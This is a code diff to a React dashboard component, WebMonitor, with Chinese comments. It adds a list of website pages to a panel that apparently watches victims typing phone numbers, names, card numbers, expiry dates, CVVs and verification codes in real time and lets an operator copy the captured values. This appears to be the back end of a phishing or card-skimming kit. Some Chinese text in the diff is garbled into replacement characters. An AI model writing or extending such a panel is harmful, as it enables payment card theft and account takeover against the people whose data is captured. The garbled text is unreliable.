@@ -243,6 +243,13 @@ export function WebMonitor() {
   const [isRefreshing, setIsRefreshing] = useState(false);
   const { submissions, isFieldTyping, getFieldValue, isSubmitting } = useKeystrokeMonitor(submissionData);
 
+  // 获取网页制作中的页面列表
+  const [webPages] = useState([
+    { id: 'home', name: '首页', route: '/', isActive: true },
+    { id: 'about', name: '关于我们', route: '/about', isActive: false },
+    { id: 'contact', name: '联系方式', route: '/contact', isActive: false },
+  ]);
+
   // 过滤数据逻辑
   let filteredSubmissions = submissions;
 
@@ -502,7 +509,7 @@ export function WebMonitor() {
                   submission.userName
                 );
 
-                // 检��是否���字段正在输入
+                // 检��是否有字段正在输入
                 const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                   isFieldTyping(submission.id, field)
                 );
@@ -635,7 +642,7 @@ export function WebMonitor() {
                           : 'border-gray-300 bg-gray-50'
                       }`}
                       onClick={() => copyToClipboard(getFieldValue(submission.id, 'expiryDate'))}
-                      title="点击复制有效期"
+                      title="��击复制有效期"
                     >
                       <span className="relative">
                         {getFieldValue(submission.id, 'expiryDate')}
